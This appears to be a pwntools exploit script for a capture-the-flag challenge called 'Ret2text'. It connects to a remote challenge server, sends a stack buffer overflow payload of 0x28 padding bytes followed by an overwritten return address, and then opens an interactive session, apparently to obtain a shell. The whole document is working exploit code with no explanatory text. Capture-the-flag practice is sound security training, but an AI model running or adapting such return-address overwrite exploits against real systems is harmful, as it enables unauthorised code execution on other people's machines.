from pwn import *
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
context(os='linux', arch='amd64',log_level = 'debug')

#p = process("./Ret2text")
p = remote("gz.imxbt.cn",20972)

payload = b'a'*0x28+p64(0x4011BB)

p.sendline(payload)

p.interactive()
